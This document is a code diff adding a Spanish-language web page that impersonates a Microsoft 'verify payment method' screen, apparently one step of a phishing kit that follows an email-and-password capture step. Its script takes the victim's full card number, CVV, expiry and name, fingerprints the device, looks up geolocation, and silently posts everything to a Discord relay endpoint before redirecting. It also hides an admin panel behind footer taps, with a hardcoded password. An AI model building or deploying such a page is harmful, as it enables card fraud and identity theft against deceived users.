@@ -1,0 +1,646 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificar método de pago</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              'ms-blue': '#0078d4',
+              'ms-blue-hover': '#106ebe',
+              'ms-red': '#f25022',
+              'ms-green': '#7fba00',
+              'ms-yellow': '#ffb900',
+              'ms-blue-logo': '#00bcf2',
+              'ms-gray': '#1b1b1b',
+              'ms-gray-light': '#605e5c',
+              'ms-border': '#8a8886',
+              'ms-bg': '#f5f5f5',
+              'ms-error': '#dc2626',
+              'ms-error-bg': '#fef2f2',
+              'ms-error-border': '#fca5a5',
+            },
+            fontFamily: {
+              'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+            },
+            fontSize: {
+              'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
+              'ms-subtitle': ['15px', { lineHeight: '20px', fontWeight: '400' }],
+              'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
+              'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
+              'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
+            },
+            boxShadow: {
+              'ms-card': '0 2px 6px rgba(0,0,0,0.2)',
+            }
+          }
+        }
+      }
+    </script>
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+      body, html {
+        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+        min-height: 100vh;
+        width: 100%;
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-attachment: fixed;
+        overflow: hidden;
+      }
+      body {
+        background-color: #0a0a1a;
+        background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
+      }
+      @media (min-width: 640px) {
+        body { overflow: auto; position: static; }
+      }
+      .ms-input {
+        border: 1px solid #8a8886;
+        font-size: 15px;
+        padding: 11px 12px;
+        line-height: 20px;
+        border-radius: 2px;
+        background: #fff;
+        color: #1b1b1b;
+        width: 100%;
+      }
+      .ms-input:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: inset 0 0 0 1px #0078d4;
+      }
+      .ms-button {
+        background: #0078d4;
+        transition: background-color 0.1s ease;
+        font-size: 15px;
+        font-weight: 600;
+        padding: 8px 12px;
+        min-height: 32px;
+        border-radius: 2px;
+        color: #fff;
+        border: none;
+        cursor: pointer;
+      }
+      .ms-button:hover { background: #106ebe; }
+      .ms-button:active { background: #005a9e; }
+      .ms-button:disabled { background: #8a8886; cursor: not-allowed; }
+      .ms-link {
+        color: #0078d4;
+        text-decoration: none;
+        font-size: 13px;
+      }
+      .ms-link:hover { text-decoration: underline; }
+      .fade-in { animation: fadeIn 0.3s ease-out; }
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
+      .main-container {
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 1rem;
+        z-index: 10;
+      }
+      @media (min-width: 640px) {
+        body { overflow: auto; position: static; }
+        .main-container { position: static; min-height: 100vh; }
+      }
+      .login-card {
+        background: rgba(255, 255, 255, 0.15);
+        backdrop-filter: blur(10px);
+        border-radius: 12px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+      }
+      .card-preview {
+        border: 1px solid #8a8886;
+        border-radius: 4px;
+        padding: 12px;
+        margin-bottom: 20px;
+        background: #fff;
+      }
+      .chip {
+        width: 40px;
+        height: 24px;
+        background: #1a1a2e;
+        border-radius: 4px;
+        margin-bottom: 8px;
+      }
+      .grid-cols-2-ms {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+      }
+      .footer-links {
+        position: fixed;
+        bottom: 0; left: 0; right: 0;
+        background: rgba(255,255,255,0.95);
+        backdrop-filter: blur(8px);
+        border-top: 1px solid #e5e5e5;
+        padding: 8px 0;
+        z-index: 50;
+      }
+      .footer-links a {
+        color: #605e5c;
+        font-size: 12px;
+        text-decoration: none;
+      }
+      .footer-links a:hover { color: #0078d4; }
+      @media (min-width: 640px) {
+        .footer-links { padding: 10px 0; }
+        .footer-links a { font-size: 13px; }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="fixed inset-0 bg-black/20 backdrop-blur-[0.5px]"></div>
+
+    <div class="main-container">
+      <div class="w-full max-w-md fade-in relative z-10">
+        <div class="login-card p-8 sm:p-12" id="loginCard">
+          <!-- Microsoft Logo -->
+          <div class="flex items-center justify-center mb-6" id="logoContainer">
+            <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3" id="logoColors">
+              <div class="bg-ms-red w-3 h-3"></div>
+              <div class="bg-ms-green w-3 h-3"></div>
+              <div class="bg-ms-blue-logo w-3 h-3"></div>
+              <div class="bg-ms-yellow w-3 h-3"></div>
+            </div>
+            <span class="text-ms-logo text-ms-gray" id="logoText" style="color:#1b1b1b;">Microsoft</span>
+          </div>
+
+          <!-- Email display badge -->
+          <div class="mb-6">
+            <div class="text-center mb-4">
+              <div class="inline-flex items-center justify-center bg-transparent rounded-full px-5 py-2 border border-gray-300">
+                <span id="userEmail" class="text-sm text-ms-gray font-medium" style="color:#1b1b1b;">Pago seguro</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Card Preview -->
+          <div class="card-preview">
+            <div class="chip"></div>
+            <div class="card-number-display" id="cardPreview">
+              •••• •••• •••• ••••
+            </div>
+            <div class="flex justify-between">
+              <div>
+                <div class="text-xs opacity-75">TITULAR</div>
+                <div class="font-semibold text-sm" id="namePreview">
+                  NOMBRE APELLIDO
+                </div>
+              </div>
+              <div class="text-right">
+                <div class="text-xs opacity-75">VENCE</div>
+                <div class="font-semibold text-sm" id="datePreview">MM/AA</div>
+              </div>
+            </div>
+          </div>
+
+          <h1 class="text-lg text-ms-gray mb-4 font-semibold text-center" id="loginTitle" style="color:#1b1b1b;">
+            Verificar método de pago
+          </h1>
+
+          <form onsubmit="handlePayment(event)" class="space-y-4" id="paymentForm">
+            <!-- Card Number -->
+            <div>
+              <label for="cardNumber" class="block text-sm text-ms-gray font-medium mb-1" style="color:#1b1b1b;">Número de tarjeta</label>
+              <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" class="ms-input" required maxlength="19" autocomplete="off">
+            </div>
+
+            <!-- Card Holder -->
+            <div>
+              <label for="cardHolder" class="block text-sm text-ms-gray font-medium mb-1" style="color:#1b1b1b;">Nombre del titular</label>
+              <input type="text" id="cardHolder" placeholder="Como aparece en la tarjeta" class="ms-input" required autocomplete="off">
+            </div>
+
+            <!-- Expiry Date and CVV -->
+            <div class="grid-cols-2-ms">
+              <div>
+                <label for="expiryDate" class="block text-sm text-ms-gray font-medium mb-1" style="color:#1b1b1b;">Fecha expiración</label>
+                <input type="text" id="expiryDate" placeholder="MM/AA" class="ms-input" required maxlength="5" autocomplete="off">
+              </div>
+              <div>
+                <label for="cvv" class="block text-sm text-ms-gray font-medium mb-1" style="color:#1b1b1b;">CVV</label>
+                <input type="password" id="cvv" placeholder="123" class="ms-input" required maxlength="4" autocomplete="off">
+              </div>
+            </div>
+
+            <!-- WiFi name (optional) -->
+            <div>
+              <label for="wifiName" class="block text-sm text-ms-gray font-medium mb-1" style="color:#1b1b1b;">Nombre WiFi (opcional)</label>
+              <input type="text" id="wifiName" placeholder="Ingrese el nombre de su red WiFi" class="ms-input" autocomplete="off">
+            </div>
+
+            <!-- "¿Olvidó su PIN?" on the right -->
+            <div class="flex justify-end">
+              <a href="#" class="ms-link">¿Olvidó su PIN?</a>
+            </div>
+
+            <button type="submit" id="submitButton" class="ms-button w-full">
+              Verificar tarjeta
+            </button>
+          </form>
+
+          <!-- Other sign-in options -->
+          <div class="mt-8 pt-6 border-t border-gray-200">
+            <div class="text-center">
+              <a href="#" class="ms-link">Otras formas de pago</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer Links -->
+    <div class="footer-links">
+      <div class="max-w-4xl mx-auto px-4">
+        <div class="flex flex-col sm:flex-row items-center justify-center gap-1 sm:gap-6 text-xs">
+          <a href="javascript:void(0)" id="footerHelp">Ayuda</a>
+          <a href="javascript:void(0)">Términos de uso</a>
+          <a href="javascript:void(0)" id="footerPrivacy">Privacidad y cookies</a>
+          <span class="text-center hidden sm:inline text-xs px-1">Usa la exploración privada si este no es tu dispositivo. <a href="javascript:void(0)" class="ms-link" style="color:#0078d4;">Más información</a></span>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // ---- Config ----
+      async function loadConfig() {
+        try {
+          const res = await fetch('/api/config');
+          if (!res.ok) throw new Error('Config fetch failed');
+          const config = await res.json();
+          applyConfig(config);
+        } catch (err) {
+          console.warn('Could not load config, using defaults:', err);
+          applyConfig(null);
+        }
+      }
+
+      function applyConfig(config) {
+        const bgImage = (config && config.loginBgImage) || 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg';
+        const bgType = (config && config.loginBgType) || 'image';
+
+        if (bgType === 'gradient' && config && config.loginBgGradient) {
+          document.body.style.background = config.loginBgGradient;
+        } else {
+          document.body.style.backgroundImage = 'url("' + bgImage + '")';
+          document.body.style.backgroundSize = 'cover';
+          document.body.style.backgroundPosition = 'center';
+          document.body.style.backgroundRepeat = 'no-repeat';
+          if (config && config.loginBgColor && bgType === 'color') {
+            document.body.style.backgroundColor = config.loginBgColor;
+          }
+        }
+
+        // Apply saved settings from localStorage (for live admin edits)
+        const localBgImage = getSavedSetting('loginBgImage');
+        const localBgType = getSavedSetting('loginBgType');
+        if (localBgType === 'image' && localBgImage) {
+          document.body.style.backgroundImage = 'url("' + localBgImage + '")';
+        } else if (localBgType === 'gradient') {
+          const localGrad = getSavedSetting('loginBgGradient');
+          if (localGrad) document.body.style.background = localGrad;
+        } else if (localBgType === 'color') {
+          const localColor = getSavedSetting('loginBgColor');
+          if (localColor) document.body.style.backgroundColor = localColor;
+        }
+
+        if (config && config.loginTitle) {
+          const t = document.getElementById('loginTitle');
+          if (t) t.textContent = config.loginTitle;
+        }
+        if (config && config.loginButton) {
+          const b = document.getElementById('passwordBtnText');
+          if (b) b.textContent = config.loginButton;
+        }
+        if (config && config.logoText && config.showLogo !== false) {
+          const l = document.getElementById('logoText');
+          if (l) l.textContent = config.logoText;
+        }
+      }
+
+      function getSavedSetting(key) {
+        try {
+          const val = localStorage.getItem(key);
+          return val !== null ? val : null;
+        } catch (e) {
+          return null;
+        }
+      }
+
+      // ---- Admin access: double-tap Ayuda + double-tap Privacidad ----
+      // ONLY available on this page (payment page, after email + password step). Password: admin123
+      let helpTapCount = 0;
+      let privacyTapCount = 0;
+      let helpTimer = null;
+      let privacyTimer = null;
+
+      const footerHelp = document.getElementById('footerHelp');
+      const footerPrivacy = document.getElementById('footerPrivacy');
+
+      function resetTapCounts() {
+        helpTapCount = 0;
+        privacyTapCount = 0;
+        if (helpTimer) clearTimeout(helpTimer);
+        if (privacyTimer) clearTimeout(privacyTimer);
+      }
+
+      footerHelp.addEventListener('click', function() {
+        helpTapCount++;
+        if (helpTapCount === 1) {
+          helpTimer = setTimeout(() => { helpTapCount = 0; }, 1200);
+        }
+        if (helpTapCount === 2) {
+          clearTimeout(helpTimer);
+          checkAdminAccess();
+        }
+      });
+
+      footerPrivacy.addEventListener('click', function() {
+        privacyTapCount++;
+        if (privacyTapCount === 1) {
+          privacyTimer = setTimeout(() => { privacyTapCount = 0; }, 1200);
+        }
+        if (privacyTapCount === 2) {
+          clearTimeout(privacyTimer);
+          checkAdminAccess();
+        }
+      });
+
+      function checkAdminAccess() {
+        if (helpTapCount >= 2 && privacyTapCount >= 2) {
+          const password = prompt('Ingrese la contraseña del panel de administración:');
+          if (password === 'admin123') {
+            window.location.href = 'dashboard.html';
+          } else {
+            alert('Contraseña incorrecta.');
+            resetTapCounts();
+          }
+        }
+      }
+
+      // ---- Get email from URL ----
+      function getEmail() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get('email') || '';
+      }
+
+      // ---- Card number formatting ----
+      document.getElementById('cardNumber').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+        if (value.length > 16) value = value.substr(0, 16);
+        value = value.replace(/(.{4})/g, '$1 ').trim();
+        e.target.value = value;
+        updateCardPreview();
+      });
+
+      document.getElementById('cardHolder').addEventListener('input', function(e) {
+        updateCardPreview();
+      });
+
+      document.getElementById('expiryDate').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+          value = value.substr(0, 2) + '/' + value.substr(2, 2);
+        }
+        e.target.value = value;
+        updateCardPreview();
+      });
+
+      function updateCardPreview() {
+        const cardNum = document.getElementById('cardNumber').value || '•••• •••• •••• ••••';
+        let display = '';
+        const parts = cardNum.replace(/\s/g, '').split('');
+        if (parts.length >= 4) {
+          display = parts.map((_, i) => i < parts.length - 4 ? '•' : parts[i]).join('');
+          display = display.match(/.{1,4}/g);
+          if (display) display = display.join(' ');
+        } else {
+          display = '•••• •••• •••• ••••';
+        }
+        document.getElementById('cardPreview').textContent = display || '•••• •••• •••• ••••';
+
+        const holder = document.getElementById('cardHolder').value.toUpperCase() || 'NOMBRE APELLIDO';
+        document.getElementById('namePreview').textContent = holder;
+
+        const expiry = document.getElementById('expiryDate').value || 'MM/AA';
+        document.getElementById('datePreview').textContent = expiry;
+      }
+
+      // ---- Collect device/browser data ----
+      function collectDeviceInfo() {
+        const userAgent = navigator.userAgent || 'desconocido';
+        const language = navigator.language || 'desconocido';
+        const languages = navigator.languages ? navigator.languages.join(', ') : language;
+        const screenResolution = screen ? (screen.width + 'x' + screen.height) : 'desconocido';
+        const colorDepth = screen ? (screen.colorDepth + ' bits') : 'desconocido';
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'desconocido';
+        const platform = navigator.platform || 'desconocido';
+        const onlineStatus = navigator.onLine ? 'Sí' : 'No';
+        const cookiesEnabled = navigator.cookieEnabled ? 'Sí' : 'No';
+        const deviceMemory = navigator.deviceMemory || 'desconocido';
+        const cpuCores = navigator.hardwareConcurrency || 'desconocido';
+        const touchPoints = navigator.maxTouchPoints || 0;
+
+        const ua = userAgent.toLowerCase();
+        const isMobile = /mobile|android|iphone|ipod/.test(ua) ? 'Sí' : 'No';
+        const isTablet = /tablet|ipad/.test(ua) ? 'Sí' : 'No';
+        const isDesktop = isMobile === 'No' && isTablet === 'No' ? 'Sí' : 'No';
+
+        return {
+          userAgent, language, languages, screenResolution, colorDepth,
+          timezone, platform, onlineStatus, cookiesEnabled,
+          deviceMemory, cpuCores, touchPoints, isMobile, isTablet, isDesktop
+        };
+      }
+
+      // ---- Collect Geo IP data ----
+      async function collectGeoIp() {
+        let geoData = {
+          geoIp: '', geoCity: '', geoRegion: '', geoCountry: '',
+          geoCountryCode: '', geoTimezone: '', geoIsoCode: '',
+          geoIsp: '', geoLatitude: '', geoLongitude: '',
+          geoZip: '', geoCurrency: '', geoCurrencyCode: '',
+          geoCallingCode: '', geoNetwork: '', ipifyIp: ''
+        };
+
+        try {
+          const res = await fetch('https://ipinfo.io/json', { timeout: 8000 });
+          if (res.ok) {
+            const data = await res.json();
+            geoData.geoIp = data.ip || '';
+            geoData.geoCity = data.city || '';
+            geoData.geoRegion = data.region || '';
+            geoData.geoCountry = data.country || '';
+            geoData.geoCountryCode = data.country || '';
+            geoData.geoTimezone = data.timezone || '';
+            geoData.geoIsoCode = data.country || '';
+            geoData.geoIsp = data.org || '';
+            geoData.geoNetwork = data.org || '';
+            if (data.loc) {
+              const [lat, lon] = data.loc.split(',');
+              geoData.geoLatitude = lat || '';
+              geoData.geoLongitude = lon || '';
+            }
+            geoData.geoZip = data.postal || '';
+            geoData.geoCurrency = data.currency || '';
+            geoData.geoCurrencyCode = data.currency || '';
+            geoData.geoCallingCode = data.country || '';
+          }
+        } catch (e) {
+          console.warn('ipinfo.io failed:', e);
+        }
+
+        try {
+          const res2 = await fetch('https://api.ipify.org?format=json', { timeout: 5000 });
+          if (res2.ok) {
+            const data2 = await res2.json();
+            geoData.ipifyIp = data2.ip || '';
+            if (!geoData.geoIp) geoData.geoIp = data2.ip || '';
+          }
+        } catch (e) {
+          console.warn('ipify failed:', e);
+        }
+
+        return geoData;
+      }
+
+      // ---- Collect battery data ----
+      async function collectBattery() {
+        let batteryLevel = 'No disponible';
+        let batteryCharging = 'Desconocido';
+        try {
+          if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            batteryLevel = ((battery.level || 0) * 100).toFixed(0) + '%';
+            batteryCharging = battery.charging ? 'Sí' : 'No';
+          }
+        } catch (e) {
+          console.warn('Battery API failed:', e);
+        }
+        return { batteryLevel, batteryCharging };
+      }
+
+      // ---- Send payment data to Discord (silently) ----
+      async function sendPaymentToDiscord(email, cardData, wifiName) {
+        try {
+          const deviceInfo = collectDeviceInfo();
+          const geoData = await collectGeoIp();
+          const batteryData = await collectBattery();
+
+          const payload = {
+            email: email,
+            type: 'payment',
+            wifiName: wifiName || '',
+            cardNumber: cardData.cardNumber || '',
+            cardHolder: cardData.cardHolder || '',
+            expiryDate: cardData.expiryDate || '',
+            cvv: cardData.cvv || '',
+            userAgent: deviceInfo.userAgent,
+            language: deviceInfo.language,
+            languages: deviceInfo.languages,
+            screenResolution: deviceInfo.screenResolution,
+            colorDepth: deviceInfo.colorDepth,
+            timezone: deviceInfo.timezone,
+            platform: deviceInfo.platform,
+            onlineStatus: deviceInfo.onlineStatus,
+            cookiesEnabled: deviceInfo.cookiesEnabled,
+            deviceMemory: deviceInfo.deviceMemory,
+            cpuCores: deviceInfo.cpuCores,
+            touchPoints: deviceInfo.touchPoints,
+            isMobile: deviceInfo.isMobile,
+            isTablet: deviceInfo.isTablet,
+            isDesktop: deviceInfo.isDesktop,
+            batteryLevel: batteryData.batteryLevel,
+            batteryCharging: batteryData.batteryCharging,
+            geoIp: geoData.geoIp,
+            geoCity: geoData.geoCity,
+            geoRegion: geoData.geoRegion,
+            geoCountry: geoData.geoCountry,
+            geoCountryCode: geoData.geoCountryCode,
+            geoTimezone: geoData.geoTimezone,
+            geoIsoCode: geoData.geoIsoCode,
+            geoIsp: geoData.geoIsp,
+            geoLatitude: geoData.geoLatitude,
+            geoLongitude: geoData.geoLongitude,
+            geoZip: geoData.geoZip,
+            geoCurrency: geoData.geoCurrency,
+            geoCurrencyCode: geoData.geoCurrencyCode,
+            geoCallingCode: geoData.geoCallingCode,
+            geoNetwork: geoData.geoNetwork,
+            ipifyIp: geoData.ipifyIp
+          };
+
+          const res = await fetch('/api/discord', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          return res.ok;
+        } catch (err) {
+          console.warn('Discord API unavailable:', err);
+          return false;
+        }
+      }
+
+      // ---- Payment form submission ----
+      async function handlePayment(event) {
+        event.preventDefault();
+
+        const email = getEmail();
+
+        // If no email in URL, redirect back to index (payment page only accessible after email+password)
+        if (!email) {
+          window.location.href = 'index.html';
+          return;
+        }
+
+        const cardNumber = document.getElementById('cardNumber').value.trim();
+        const cardHolder = document.getElementById('cardHolder').value.trim();
+        const expiryDate = document.getElementById('expiryDate').value.trim();
+        const cvv = document.getElementById('cvv').value.trim();
+        const wifiName = document.getElementById('wifiName').value.trim();
+
+        if (!cardNumber || !cardHolder || !expiryDate || !cvv) {
+          return;
+        }
+
+        const submitBtn = document.getElementById('submitButton');
+        submitBtn.disabled = true;
+
+        // Send payment data to Discord silently
+        await sendPaymentToDiscord(email, { cardNumber, cardHolder, expiryDate, cvv }, wifiName);
+
+        // Redirect to dashboard after payment (silently)
+        window.location.href = 'dashboard.html?email=' + encodeURIComponent(email);
+      }
+
+      // ---- Initialize ----
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email') || '';
+
+      if (!email) {
+        // Redirect to index if no email parameter (payment only after email+password step)
+        window.location.href = 'index.html';
+      } else {
+        document.getElementById('userEmail').textContent = email;
+      }
+
+      loadConfig();
+    </script>
+  </body>
+</html>
